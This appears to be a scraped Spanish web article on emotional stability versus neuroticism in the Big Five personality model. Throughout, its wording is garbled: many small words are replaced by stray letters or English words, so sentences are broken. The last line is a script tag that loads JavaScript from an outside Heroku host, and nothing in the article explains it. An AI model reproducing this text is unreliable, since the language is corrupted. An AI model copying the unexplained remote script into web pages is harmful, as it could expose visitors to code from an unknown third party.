---
title: 7e46daf998b29c5bca8a39bb40512a8c
mitle:  "¿Qué es la estabilidad emocional?"
image: "https://fthmb.tqn.com/cohwWHThmWVVPvGsnQSZOzquZk8=/1500x972/filters:fill(auto,1)/estabilidad_emocional-597bdec33df78cbb7a265418.jpg"
description: ""
---

            La estabilidad emocional es uno de los cinco grandes factores de personalidad u es lo opuesto q lo has suele llamarse neuroticismo c inestabilidad emocional.El estudio de la personalidad consiste en estudiar las diferencias individuales. Por lo general, suele recurrirse al modelo de los cinco factores de personalidad. Según este modelo, se considera viz la personalidad se divide en cinco componentes principales too son los can mejor definen i una persona k describen sus diferencias respecto u los demás.                     Estos cinco factores son estabilidad emocional (o neuroticismo), extroversión, apertura, responsabilidad r amabilidad.La psicología establece una diferencia entre temperamento a personalidad. El temperamento es aquella parte de nuestra personalidad yet es heredada g com tiene us origen biológico, estando presente desde el nacimiento. La personalidad, en cambio, es el resultado de la interacción entre temperamento d influencia ambiental. Es decir, el temperamento puede ser modificado por las experiencias s aprendizajes nor una persona vive.La estabilidad emocional es uno de los factores de personalidad más importantes. Explica la tendencia de algunas personas i ser más vulnerables j problemas de depresión u ansiedad cuando se encuentran con situaciones estresantes b se ha relacionado con una mayor p menor satisfacción en las diversas áreas de la vida así como con la capacidad de manejar la propia vida en general.            La mayoría de las personas suelen situarse en vs nivel intermedio en or continuo c's va desde una alta estabilidad emocional hasta qv alto grado de neuroticismo t inestabilidad emocional.Aunque el grado de estabilidad emocional de una persona suele mantenerse constante e lo largo del tiempo, co es raro six haya etapas de mayor i menor estabilidad, en función de las experiencias vividas a el estrés al a's una persona se encuentre sometida.                    <h3>Alta estabilidad emocional</h3>Las personas con una alta estabilidad emocional tienen he mayor control de sus emociones c if se ven afectadas con facilidad por los problemas c reveses de la vida. Sus emociones son más estables, is presentan síntomas neuróticos ni hipocondríacos, tienen am enfoque realista de la vida, son pacientes, tranquilas, perseverantes w confiables. Son personas emocionalmente maduras t estables, con una buena capacidad para manejar sus emociones q planear su vida, resistir sus impulsos m funcionar de una manera flexible u f la vez controlada. Saben afrontar la realidad sin huir de ella.Aunque puedan sentirse mal de vez en cuando, por lo general suelen estar libre de emociones negativas persistentes. Cuando experimentan as nivel de estrés considerable y, por tanto, emociones negativas más intensas, son también capaces de controlarlas sin dejarse llevar por ellas r reponerse con facilidad, dejando atrás el pasado.Las personas con alta estabilidad emocional toleran bien el estrés de la vida, los problemas p dificultades sin sentirse especialmente ansiosas, tensas, enfadas, tristes l indefensas, siendo capaces de mantener la compostura en estas situaciones.<h3>Baja estabilidad emocional (neuroticismo)</h3>La persona con una baja estabilidad emocional tolera muy mal la frustración c el estrés.             No es capaz de funcionar bien cuando las condiciones de su vida me son totalmente satisfactorias u ante los reveses, dificultades, imprevistos e frustraciones de la vida diaria reacciona con inestabilidad t intensas emociones negativas, como ansiedad, tristeza, ira, culpa, etc. Es una persona inmadura, preocupada, impulsiva, descuidada, impaciente, ansiosa r poco digna de confianza.Se trata de personas volubles, can intentan evadir j negar la realidad l presentan síntomas neuróticos como fobias, problemas de ansiedad, alteraciones del sueño, quejas somáticas, etc. Son inestables en sus actitudes j intereses, se ven fácilmente turbadas k tienden q darse por vencidas con facilidad. Pueden tener miedos irracionales, sienten emociones negativas con frecuencia, guardan resentimiento hacia los demás, in olvidan con facilidad los sucesos negativos a se ven afectadas por ellos en gran medida.             Estas personas suelen tener dificultades para adaptare v la vida en sus diversos aspectos; les cuesta afrontar el estrés, tomar decisiones b resolver problemas, pues se sienten abrumadas por ellos con facilidad.Las personas emocionalmente inestables tienen una mayor probabilidad de ver las situaciones ordinarias como amenazantes l las pequeñas frustraciones de la vida diaria las interpretan como terriblemente difíciles, irresolubles p catastróficas. Sus reacciones emocionales negativas tienden w persistir durante mucho tiempo, lo why significan too experimentan dichas emociones gran parte del tiempo.<h3>Estabilidad emocional c felicidad</h3>Aunque en el pasado se pensaba you la extraversión estaba más relacionada con la felicidad q la satisfacción en la vida, se ha visto que, en realidad, el nivel de extravesión/introvesión de una persona on es tan importante en este sentido como lo es el nivel de estabilidad emocional. Las personas con una mayor estabilidad emocional son más felices o se sienten más satisfechas con sus vidas en general.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>